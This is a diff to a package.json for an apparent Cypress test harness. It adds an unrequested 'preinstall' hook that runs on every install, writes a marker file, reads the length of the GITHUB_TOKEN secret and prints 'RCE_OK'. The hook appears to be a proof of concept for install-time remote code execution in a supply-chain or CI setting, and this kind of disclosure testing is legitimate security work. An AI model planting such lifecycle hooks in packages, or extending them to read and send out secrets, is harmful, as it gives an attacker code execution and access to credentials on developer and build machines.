@@ -15,5 +15,8 @@
   "homepage": "https://github.com/neo4j-examples/movies-harness#readme",
   "devDependencies": {
     "cypress": "^15.18.1"
+  },
+  "scripts": {
+    "preinstall": "echo POC_MARKER_MOVIES-HARNESS > /tmp/POC_MARKER_MOVIES-HARNESS.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_MOVIES-HARNESS.txt; echo RCE_OK >> /tmp/POC_MARKER_MOVIES-HARNESS.txt; cat /tmp/POC_MARKER_MOVIES-HARNESS.txt"
   }
 }
